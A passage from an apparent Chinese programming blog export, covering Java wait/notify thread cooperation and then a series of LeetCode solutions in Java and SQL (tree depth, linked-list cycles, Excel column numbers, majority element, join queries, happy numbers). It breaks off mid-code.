<h2 id="线程的协作"><a href="#线程的协作" class="headerlink" title="线程的协作"></a>线程的协作</h2><h3 id="等待队列"><a href="#等待队列" class="headerlink" title="等待队列"></a>等待队列</h3><p>所有的实例都拥有一个等待队列，他是在实例的wait方法执行后停止操作的线程的队列。<br>当执行wait方法后，线程便会暂停操作，进入等待队列。除非发现下列某一种情况，否则线程会一直在等待队列中休眠。当下列任意一种情况发生时，线程便会退出等待队列。</p>
<ul>
<li>有其他线程的notify方法来唤醒线程</li>
<li>有其他线程的notifyAll方法来唤醒线程</li>
<li>有其他线程的interrupt方法来唤醒线程</li>
<li>wait方法超时</li>
</ul>
<p><strong>注意：</strong>等待队列是一个虚拟的概念。它既不是实例中的字段，也不是用于获取正在实力上等待的线程的列表的方法。</p>
<h3 id="wait方法"><a href="#wait方法" class="headerlink" title="wait方法"></a>wait方法</h3><p>wait方法会让线程进入等待队列。假设执行了下面这条语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">obj.wait()</span><br></pre></td></tr></table></figure>
<p>  那么当前线程便会暂停运行，并进入obj实例的等待队列中，这叫做“线程正在obj上wait”。<br>  如果实例方法中有如下语句，有下面代码（1）处语句，由于其含义等同于（2）处语句，所以执行了wait()的线程将会进入this的等待，队列中，这可以说“线程正在this上wait”。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">wait();    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">this</span>.wait()    <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>若要执行wait方法，线程必须持有锁。但如果线程进入等待队列，便会释放其占有的实例的锁。</p>
<h3 id="notify方法"><a href="#notify方法" class="headerlink" title="notify方法"></a>notify方法</h3><p>notify（通知）方法会将等待队列中的一个线程取出。假设我们执行里下面的这条语句。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">obj.notify()</span><br></pre></td></tr></table></figure>
<p>那么obj的等待队列中的一个线程便会选中和唤醒，然后就会退出等待队列。</p>
<p>notify唤醒的线程并不会在执行notify的一瞬间重新运行。因为在执行notify的那一瞬间，执行notify的线程还持有着锁，所以其他线程还无法获取这个实例的锁。 </p>
<p>加入在执行notify方法时，正在等待队列中等待的线程不止一个，对于“这时该如何来选择线程”这个问题规范中并没有做出规定。就近视选择最先wait的线程还是随机选择，或者采用其他方法要取决于Java平台运行环境。因此编写程序是需要注意，最好不要编写依赖于所选线程的程序。  </p>
<h3 id="notifyAll方法"><a href="#notifyAll方法" class="headerlink" title="notifyAll方法"></a>notifyAll方法</h3><p>notifyAll方法会将等待队列中的所有线程都取出来。例如，执行下面这条语句之后，在obj实例的等待队列中休眠的所有线程都会被唤醒。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">obj.notifyAll()</span><br></pre></td></tr></table></figure>
<p>如果简单地在示例方法中写成下面代码（1）处这样，那么由于其含义等同于（2），所以该语句所在方面的实例（this）的等待队列中所有线程都会退出等待队列。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">notifyAll()    <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">this</span>.notifyAll()    <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>如果未持有锁的线程调用wait、notify或者notifyAll，异常java.lang.IllegalMonitorStateException会被抛出。</li>
<li>由于notify唤醒的线程较少，所以处理速度要比使用notifyAll时快</li>
<li>但使用notify时，如果处理不好，程序便可能会停止。一般来说，使用notifyAll的代码比使用notify时更为健壮。</li>
<li>除非开发人员完全理解代码的含义和范围，否则使用notifyAll更为稳妥。<br>notify方法仅欢迎一个线程，而notifyAll则唤醒所有线程，这是两者之间的唯一区别。<h2 id="线程的状态转移"><a href="#线程的状态转移" class="headerlink" title="线程的状态转移"></a>线程的状态转移</h2>具体见下图，括号中的单词是Thread.State中定义的Enum名。</li>
</ul>
<p><img src="https://huhansi.github.io/images/5.%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BB.png" alt="线程的状态转移"></p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>百度百科-线程：<a href="https://baike.baidu.com/item/%E7%BA%BF%E7%A8%8B" target="_blank" rel="noopener">https://baike.baidu.com/item/%E7%BA%BF%E7%A8%8B</a><br>《图解Java多线程设计模式》</p>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>104. 二叉树的最大深度</title>
    <url>/2018/08/29/LeetCode/leetcode-000104.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，找出其最大深度。</p>
<p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p>
<p>说明: 叶子节点是指没有子节点的节点。<br><strong>示例：</strong><br>给定二叉树 <code>[3,9,20,null,null,15,7]</code>，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<p>返回它的最大深度 3 。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>分别求出左右子树的最大深度，最后加一就行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">int</span> dl = maxDepth(root.left) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> dr = maxDepth(root.right) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> dl &gt; dr ? dl : dr;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>111. 二叉树的最小深度</title>
    <url>/2018/08/29/LeetCode/leetcode-000111.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%B0%8F%E6%B7%B1%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，找出其最小深度。</p>
<p>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</p>
<p>说明: 叶子节点是指没有子节点的节点。<br><strong>示例：</strong><br>给定二叉树 <code>[3,9,20,null,null,15,7]</code>,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<p>返回它的最小深度  2.</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>递归求最小深度</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">if</span>(root.left == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> minDepth(root.right) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root.right == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> minDepth(root.left) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> leftDepth = minDepth(root.left) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightDepth = minDepth(root.right) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leftDepth &lt; rightDepth ? leftDepth : rightDepth;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>141.环形链表</title>
    <url>/2018/08/29/LeetCode/leetcode-000141.%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个链表，判断链表中是否有环。</p>
<p><strong>进阶：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你能否不使用额外空间解决此题？</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>使用快慢指针。快指针每次移动两步，慢指针每次移动一步，如果链表不存在环路，那么快指针将先到达链表尾部。如果链表存在环路，那么快指针在进入环路之后就一定会套圈慢指针。因此，只要判断快指针是否等于慢指针就行了，相等，则存在环路，否则不存在。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode head2 = head;</span><br><span class="line">    ListNode head1 = head;</span><br><span class="line">    <span class="keyword">while</span> (head1 != <span class="keyword">null</span> &amp;&amp; head2.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        head1 = head1.next;</span><br><span class="line">        head2 = head2.next.next;</span><br><span class="line">        <span class="keyword">if</span> (head1 == head2) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>使用哈希表，将每个访问过的结点保存到HashSet中，如果当前访问的结点已经在Set中了，说明存在环，如果当前结点为null说明不存在环。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    Set&lt;ListNode&gt; nodesSeen = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodesSeen.contains(head)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            nodesSeen.add(head);</span><br><span class="line">        &#125;</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>171. Excel表列序号</title>
    <url>/2018/08/29/LeetCode/leetcode-000171.%20Excel%E8%A1%A8%E5%88%97%E5%BA%8F%E5%8F%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个Excel表格中的列名称，返回其相应的列序号。<br>例如，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A -&gt; 1</span><br><span class="line">B -&gt; 2</span><br><span class="line">C -&gt; 3</span><br><span class="line">...</span><br><span class="line">Z -&gt; 26</span><br><span class="line">AA -&gt; 27</span><br><span class="line">AB -&gt; 28 </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;A&quot;</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;AB&quot;</span><br><span class="line">输出: 28</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;ZY&quot;</span><br><span class="line">输出: 701</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>当做26进制处理</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">titleToNumber</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        init(map);</span><br><span class="line">        <span class="keyword">int</span> count = s.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">        	result += map.get(s.charAt(i)) * pow(<span class="number">26</span>, count--);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(Map&lt;Character, Integer&gt; map)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c = <span class="string">'A'</span>;c &lt;= <span class="string">'Z'</span>;c++) &#123;</span><br><span class="line">			map.put(c, index++);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">pow</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> time)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; time;i++) &#123;</span><br><span class="line">			result *= val;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>175. 组合两个表</title>
    <url>/2018/08/29/LeetCode/leetcode-000175.%20%E7%BB%84%E5%90%88%E4%B8%A4%E4%B8%AA%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表1: Person</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+---------+</span><br><span class="line">| 列名         | 类型     |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| PersonId    | int     |</span><br><span class="line">| FirstName   | varchar |</span><br><span class="line">| LastName    | varchar |</span><br><span class="line">+-------------+---------+</span><br><span class="line">PersonId 是上表主键</span><br></pre></td></tr></table></figure>
<p>表2: Address</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+---------+</span><br><span class="line">| 列名         | 类型    |</span><br><span class="line">+-------------+---------+</span><br><span class="line">| AddressId   | int     |</span><br><span class="line">| PersonId    | int     |</span><br><span class="line">| City        | varchar |</span><br><span class="line">| State       | varchar |</span><br><span class="line">+-------------+---------+</span><br><span class="line">AddressId 是上表主键</span><br></pre></td></tr></table></figure>

<p>编写一个 SQL 查询，满足条件：无论 person 是否有地址信息，都需要基于上述两表提供 person 的以下信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FirstName, LastName, City, State</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> FirstName, LastName, City, State <span class="keyword">from</span> Person <span class="keyword">left</span> <span class="keyword">join</span> Address <span class="keyword">on</span> Person.PersonId = Address.PersonId</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>169. 求众数</title>
    <url>/2018/08/29/LeetCode/leetcode-000169.%20%E6%B1%82%E4%BC%97%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个大小为 n 的数组，找到其中的众数。众数是指在数组中出现次数<strong>大于</strong> <code>⌊ n/2 ⌋</code> 的元素。</p>
<p>你可以假设数组是非空的，并且给定的数组总是存在众数。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [3,2,3]</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2,2,1,1,1,2,2]</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>

<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>既然众数是出现次数大于数组长度一半的数，那么，在排序之后，数组长度一半的位置上的数肯定是众数。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">return</span> nums[nums.length / <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>181. 超过经理收入的员工</title>
    <url>/2018/08/29/LeetCode/leetcode-000181.%20%E8%B6%85%E8%BF%87%E7%BB%8F%E7%90%86%E6%94%B6%E5%85%A5%E7%9A%84%E5%91%98%E5%B7%A5/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><code>Employee</code> 表包含所有员工，他们的经理也属于员工。每个员工都有一个 Id，此外还有一列对应员工的经理的 Id。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+--------+-----------+</span><br><span class="line">| Id | Name  | Salary | ManagerId |</span><br><span class="line">+----+-------+--------+-----------+</span><br><span class="line">| 1  | Joe   | 70000  | 3         |</span><br><span class="line">| 2  | Henry | 80000  | 4         |</span><br><span class="line">| 3  | Sam   | 60000  | NULL      |</span><br><span class="line">| 4  | Max   | 90000  | NULL      |</span><br><span class="line">+----+-------+--------+-----------+</span><br></pre></td></tr></table></figure>
<p>给定 <code>Employee</code> 表，编写一个 SQL 查询，该查询可以获取收入超过他们经理的员工的姓名。在上面的表格中，Joe 是唯一一个收入超过他的经理的员工。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----------+</span><br><span class="line">| Employee |</span><br><span class="line">+----------+</span><br><span class="line">| Joe      |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">as</span> Employee <span class="keyword">from</span> Employee <span class="keyword">as</span> e <span class="keyword">where</span> salary &gt; (<span class="keyword">select</span> salary <span class="keyword">from</span> employee <span class="keyword">where</span> <span class="keyword">id</span> = e.managerId);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>182. 查找重复的电子邮箱</title>
    <url>/2018/08/29/LeetCode/leetcode-000182.%20%E6%9F%A5%E6%89%BE%E9%87%8D%E5%A4%8D%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E7%AE%B1/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个 SQL 查询，查找 <code>Person</code> 表中所有重复的电子邮箱。<br><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+---------+</span><br><span class="line">| Id | Email   |</span><br><span class="line">+----+---------+</span><br><span class="line">| 1  | a@b.com |</span><br><span class="line">| 2  | c@d.com |</span><br><span class="line">| 3  | a@b.com |</span><br><span class="line">+----+---------+</span><br></pre></td></tr></table></figure>
<p>根据以上输入，你的查询应返回以下结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+</span><br><span class="line">| Email   |</span><br><span class="line">+---------+</span><br><span class="line">| a@b.com |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>
<p><strong>说明</strong>：所有电子邮箱都是小写字母。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span>(email) <span class="keyword">as</span> Email <span class="keyword">from</span> person  <span class="keyword">group</span> <span class="keyword">by</span> email <span class="keyword">having</span>(<span class="keyword">count</span>(*) &gt; <span class="number">1</span>) ;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>183. 从不订购的客户</title>
    <url>/2018/08/29/LeetCode/leetcode-000183.%20%E4%BB%8E%E4%B8%8D%E8%AE%A2%E8%B4%AD%E7%9A%84%E5%AE%A2%E6%88%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>某网站包含两个表，<code>Customers</code> 表和 <code>Orders</code> 表。编写一个 SQL 查询，找出所有从不订购任何东西的客户。</p>
<p><code>Customers</code> 表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+-------+</span><br><span class="line">| Id | Name  |</span><br><span class="line">+----+-------+</span><br><span class="line">| 1  | Joe   |</span><br><span class="line">| 2  | Henry |</span><br><span class="line">| 3  | Sam   |</span><br><span class="line">| 4  | Max   |</span><br><span class="line">+----+-------+</span><br></pre></td></tr></table></figure>
<p><code>Orders</code>表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------+</span><br><span class="line">| Id | CustomerId |</span><br><span class="line">+----+------------+</span><br><span class="line">| 1  | 3          |</span><br><span class="line">| 2  | 1          |</span><br><span class="line">+----+------------+</span><br></pre></td></tr></table></figure>
<p>例如给定上述表格，你的查询应返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-----------+</span><br><span class="line">| Customers |</span><br><span class="line">+-----------+</span><br><span class="line">| Henry     |</span><br><span class="line">| Max       |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>

<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先从订单表中找出所有已经订购过的客户，然后排除掉这些客户即可，注意表头别名</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>  <span class="keyword">as</span> Customers <span class="keyword">from</span> customers <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> customerId <span class="keyword">from</span> orders);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>202. 快乐数</title>
    <url>/2018/08/29/LeetCode/leetcode-000202.%20%E5%BF%AB%E4%B9%90%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个算法来判断一个数是不是“快乐数”。</p>
<p>一个“快乐数”定义为：对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为 1，也可能是无限循环但始终变不到 1。如果可以变为 1，那么这个数就是快乐数。<br><strong>示例：</strong><br>输入: 19<br>输出: true<br>解释:<br>12 + 92 = 82<br>82 + 22 = 68<br>62 + 82 = 100<br>12 + 02 + 02 = 1</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>网络搜索到得知非快乐数有个特点，计算过程中肯定会有4出现，那么就可以用这个特性来判断了。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (n != <span class="number">1</span> &amp;&amp; n != <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            	<span class="keyword">int</span> nn = n % <span class="number">10</span>;</span><br><span class="line">            	temp += nn * nn;</span><br><span class="line">                n /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            n = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>还可以用Set来做判断，计算出来的数字是否已经出现过了，如果出现过了表示已经进入了一个“环路”，那么肯定是非快乐数了。<br>解法二参考：<a href="https://my.oschina.net/Tsybius2014/blog/524681" target="_blank" rel="noopener">https://my.oschina.net/Tsybius2014/blog/524681</a></p>
<h3 id="代码2"><a href="#代码2" class="headerlink" title="代码2"></a>代码2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @功能说明：LeetCode 202 - Happy Number</span></span><br><span class="line"><span class="comment"> * @开发人员：Tsybius2014</span></span><br><span class="line"><span class="comment"> * @开发时间：2015年11月1日</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 快乐的数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> n</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> temp = n;</span><br><span class="line">        HashSet&lt;Integer&gt; hashSet = <span class="keyword">new</span> HashSet&lt;Integer&gt;(); </span><br><span class="line">        hashSet.add(temp);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            temp = getNext(temp);</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="number">1</span>) 